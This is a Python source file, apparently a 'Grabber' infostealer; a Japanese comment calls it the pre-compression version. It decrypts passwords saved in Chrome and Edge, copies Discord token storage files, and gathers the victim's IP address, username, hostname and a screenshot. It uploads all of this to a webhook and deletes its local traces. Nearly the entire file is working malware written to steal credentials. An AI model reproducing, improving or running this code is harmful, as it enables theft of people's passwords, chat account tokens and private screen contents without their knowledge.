"""
このファイルは実際には呼び出されません
コード圧縮前のGrabberです
"""

WEBHOOK_URL = ""
import win32crypt, requests, zipfile, getpass, sqlite3, shutil, socket, base64, json, mss, os
from Crypto.Cipher import AES

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv('APPDATA')

CHROMIUM_DIRS = [
    f"{LOCAL}\\Google\\Chrome",
    f"{LOCAL}\\Microsoft\\Edge"
]

data = ""

def findDiscordData():
    x = os.path.join(ROAMING,'discord','Local Storage','leveldb')
    if not os.path.exists(x):
        return
    for file in os.listdir(x):
        if file.endswith((".log",".ldb")):
            with zipfile.ZipFile("discordData.zip",'w') as zipf:
                zipf.write(os.path.join(x,file))

def findChromiumDatas():
    resultStr = "===== Find Chromium Datas =====\n"
    for dir in CHROMIUM_DIRS:
        localState = f"{dir}\\User Data\\Local State"
        if not os.path.exists(localState):
            return
        resultStr += "===== "+dir.split("\\")[-1]+" =====\n"
        with open(localState, encoding="utf-8") as f:
            d = json.load(f)
        profiles = d["profile"]["info_cache"]
        encryptedKey = d["os_crypt"]["encrypted_key"]
        encryptedKey = encryptedKey.encode('utf-8')
        encryptedKey = base64.b64decode(encryptedKey)[5:]
        secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
        for profileName in profiles:
            profile = profiles[profileName]
            resultStr += profileName+":\n    Email:"+profile["user_name"]+"\n    Name:"+profile["gaia_name"]+"\n    LoginData:\n"
            loginDataDb = f"{dir}\\User Data\\{profileName}\\Login Data"
            shutil.copy2(loginDataDb, "loginData")
            c = sqlite3.connect("loginData")
            cu = c.cursor()
            cu.execute("SELECT action_url, username_value, password_value FROM logins")
            for i,l in enumerate(cu.fetchall()):
                url = l[0]
                username = l[1]
                initialisationVector = l[2][3:15]
                encryptedPassword = l[2][15:-16]
                cipher = AES.new(secretKey, AES.MODE_GCM, initialisationVector) 
                password = cipher.decrypt(encryptedPassword).decode()
                if url and username and password:
                    resultStr += f"\n        ServiceUrl:{url}\n        Username:{username}\n        Password:{password}\n"
            c.close()
    return resultStr

def main():
    print("Start....")
    resultStr = findChromiumDatas()
    with open("resultLoginData.txt", encoding="utf-8", mode="w") as f:
        f.write(resultStr)
    findDiscordData()
    
    ip = requests.get("https://ifconfig.me").text
    useUser = getpass.getuser()
    hostName = socket.gethostname()
    
    monitor = {
        'left': 0,
        'top': 0,
        'width': 1920,
        'height': 1080
    }
    with mss.mss() as sct:
        screenshot = sct.grab(monitor)
        mss.tools.to_png(screenshot.rgb, screenshot.size, output="screenshot.png")
    screenshot = open("screenshot.png", 'rb')
    discordData = open("discordData.zip", 'rb')
    resultLoginData = open("resultLoginData.txt", 'rb')
    
    files = {'file': screenshot, "file": discordData, "file": resultLoginData}
    requests.post(WEBHOOK_URL, data={'content': f'# Grabber Result\n```\nIP:{ip}\nUseUser:{useUser}\nHostName:{hostName}```'}, files= {'file': screenshot})
    requests.post(WEBHOOK_URL, files= {'file': discordData})
    requests.post(WEBHOOK_URL, files= {'file': resultLoginData})
    
    screenshot.close()
    discordData.close()
    resultLoginData.close()
    
    files = ["discordData.zip", "loginData", "screenshot.png", "resultLoginData.txt"]
    for file in files:
        os.remove(file)
if __name__ == "__main__":
    main()